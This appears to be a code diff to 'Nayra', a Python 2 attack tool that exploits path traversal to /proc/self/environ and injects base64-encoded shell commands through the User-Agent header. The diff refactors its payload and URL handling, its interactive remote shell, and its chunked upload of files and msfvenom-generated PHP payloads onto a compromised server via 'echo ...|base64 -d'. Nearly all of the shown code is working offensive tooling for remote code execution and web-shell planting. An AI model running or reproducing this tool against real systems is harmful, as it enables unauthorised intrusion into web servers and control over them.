@@ -5,7 +5,8 @@ import math
 import base64
 
 try:
-    import readlines #Optional Library
+    import readline #Optional Library
+    #import gnureadline
 except ImportError:
     pass
 
@@ -16,7 +17,7 @@ class Nayra(object):
 
     def __init__(self):
         self.payloadsFile = 'nayra/resources/data.json' #You can add new payloads in this file
-        self.maxLength = 100 #Limiting value of split
+        self.maxLength = 100                            #Limiting value of split
         self.argvs = argvs.Parser()
         self.request = network.Request()
         self.fullURL = ''
@@ -49,8 +50,7 @@ class Nayra(object):
             self.help()
 
     def typeShell(self):
-        self.fullURL = self.GetFullURL()
-        self.payload = self.GetPayload(self.argvs.name)
+        self.fullURL, self.payload = self.GetPayload(self.argvs.name)
 
         '''Building the Prompt'''
         user = self.clearSplit(self.execCommand('whoami'))
@@ -72,8 +72,7 @@ class Nayra(object):
                 break
 
     def typeUpload(self):
-        self.fullURL = self.GetFullURL()
-        self.payload = self.GetPayload(self.argvs.name)
+        self.fullURL, self.payload = self.GetPayload(self.argvs.name)
 
         if self.argvs.file != '':
             '''Read and Upload the File'''
@@ -81,7 +80,7 @@ class Nayra(object):
                 upload = open(self.argvs.file, 'r')
                 self.content = upload.read()
                 upload.close()
-                self.uploadContent(self.argvs.file, True)
+                self.uploadContent(self.argvs.file, 3)
 
             except IOError:
                 print '[-]File not found'
@@ -90,8 +89,7 @@ class Nayra(object):
             self.help()
 
     def typeMsfvenom(self):
-        self.fullURL = self.GetFullURL()
-        self.payload = self.GetPayload(self.argvs.name)
+        self.fullURL, self.payload = self.GetPayload(self.argvs.name)
 
         if self.argvs.argvs != '' and self.argvs.file != '':
             '''Exec msfvenom'''
@@ -104,20 +102,11 @@ class Nayra(object):
             if self.argvs.argvs.count(addto) >= 1:
                 self.content = '<?php\n' + self.content + '\n?>\n'
             
-            self.uploadContent(self.argvs.file)
+            self.uploadContent(self.argvs.file, 2)
         
         else:
             self.help()
-        
-
-    def GetFullURL(self, rFile = '/proc/self/environ'):
-        '''Building the URL'''
-        shell = ''
-        if self.argvs.path != 0:
-            shell = '../' * int(self.argvs.path)
-        shell = (shell + rFile).replace('//', '/')
-        return self.argvs.url + shell
-
+            
     def GetPayload(self, name = 'php_1'):
         '''Get the specified payload'''
         payloads = open(self.payloadsFile, 'r')
@@ -126,30 +115,49 @@ class Nayra(object):
         data = json.loads(data)
         for payload in data['payloads']:
             if payload['name'] == name:
-                payload = payload['payload']
+                rFile = payload['file']
+                payload = payload['payload'] 
                 break
-        return payload
+            
+        '''Building the URL'''
+        shell = ''
+        if self.argvs.path != 0:
+            shell = '../' * int(self.argvs.path)
+        shell = (shell + rFile).replace('//', '/')
+        shell = self.argvs.url + shell
+        
+        return shell, payload
+
+    def GetNewURL(self):
+        url = self.argvs.url.split('/')
+        url = '/'.join(url[:-1]) + '/' + self.argvs.file
+        return url
 
     def execCommand(self, command):
-        command = base64.b64encode(command)
+        command = base64.b64encode(command + ' 2>&1')
         self.request.userAgent = self.payload.replace('{command}', command)
         output = self.request.send(self.fullURL, self.argvs.method)
 
         return output
 
-    def uploadContent(self, filename, display = False):
+    def uploadContent(self, filename, display = 3):
+        #Display Levels: 1 Split/ 2 URL / 3 Split-URL
         loop = int(math.ceil(len(self.content)/float(self.maxLength)))
-        if display == True:
+        if display == 1 or display == 3:
             print '[+]Splitting the file into ' + str(loop) + ' parts...'
                 
         filename = filename.split('/')[-1]
+        self.execCommand('echo > ' + filename)
         for frag in range(loop):
             packet = self.content[self.maxLength * frag:self.maxLength * (frag + 1)]
             packet = 'echo ' + base64.b64encode(packet) + '|base64 -d >> ' + filename
-            if display == True:
+            if display == 1 or display == 3:
                 print '[*]Uploading the part: ' + str(frag + 1)
                     
             self.execCommand(packet)
+
+        if display == 2 or display == 3:
+            print '[*]File URL: ' + self.GetNewURL()
 
     def nativeCommand(self, command):
         out = os.popen(command)
